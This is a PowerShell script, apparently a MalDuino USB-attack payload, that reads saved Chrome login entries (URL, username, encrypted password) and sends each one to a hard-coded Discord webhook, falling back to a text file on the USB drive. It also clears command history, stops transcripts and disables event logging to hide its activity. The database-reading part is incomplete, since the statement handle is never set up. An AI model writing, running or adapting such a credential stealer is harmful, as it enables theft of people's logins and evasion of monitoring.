$ErrorActionPreference = 'SilentlyContinue'
[System.Management.Automation.PSConsoleReadLine]::ClearHistory()
Stop-Transcript | Out-Null
[System.Management.Automation.Logging.PSEventLogProvider]::EventLoggingEnabled = $false

function Test-InternetConnection {
    param(
        [string]$PrimaryDNS = '8.8.8.8',
        [string]$SecondaryDNS = '1.1.1.1'
    )
    if (Test-Connection -ComputerName $PrimaryDNS -Count 1 -Quiet) {
        return $true
    }
    elseif (Test-Connection -ComputerName $SecondaryDNS -Count 1 -Quiet) {
        return $true
    }
    return $false
}

function Get-RemovableDrive {
    param(
        [string]$Label = 'MalDuino',
        [int64]$MaxSizeMB = 128
    )

    $drives = Get-WmiObject -Class Win32_Volume | Where-Object {
        $_.DriveType -eq 2 -and ($_.Label -eq $Label -or $_.Capacity -le ($MaxSizeMB * 1MB))
    }
    
    if ($drives) {
        return $drives.DriveLetter + '\'
    } else {
        return $null
    }
}

function pumpndump {
    param([String]$hq, [String]$localPath)

    $outputData = @()
    while([WinSQLite3]::Step($stmt) -eq 100) {
        $url = [WinSQLite3]::ColumnString($stmt, 0)
        $username = [WinSQLite3]::ColumnString($stmt, 1)
        $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))

        $outputData += 'URL: ' + $url + ' | Username: ' + $username + ' | Encrypted Password: ' + $encryptedPassword

        $webhookPayload = @{
            'content' = 'Chrome Login Data'
            'embeds' = @(
                @{
                    'title' = 'Login Data'
                    'fields' = @(
                        @{ 'name' = 'URL'; 'value' = $url },
                        @{ 'name' = 'Username'; 'value' = $username },
                        @{ 'name' = 'Encrypted Password'; 'value' = $encryptedPassword }
                    )
                }
            )
        } | ConvertTo-Json -Depth 4

        try {
            Invoke-RestMethod -Uri $hq -Method Post -ContentType 'application/json' -Body $webhookPayload
            $internetAvailable = $true
        }
        catch {
            $internetAvailable = $false
        }
    }
    
    if (-not $internetAvailable) {
        $outputData | Out-File -FilePath $localPath -Encoding UTF8
    }
}

$internetAvailable = Test-InternetConnection
$localPath = (Get-RemovableDrive -Label 'MalDuino' -MaxSizeMB 128) + 'login_data.txt'

if ($localPath) {
    pumpndump -hq 'https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ' -localPath $localPath
}

Stop-Transcript | Out-Null
Remove-Variable * -ErrorAction SilentlyContinue
[System.Management.Automation.PSConsoleReadLine]::ClearHistory()
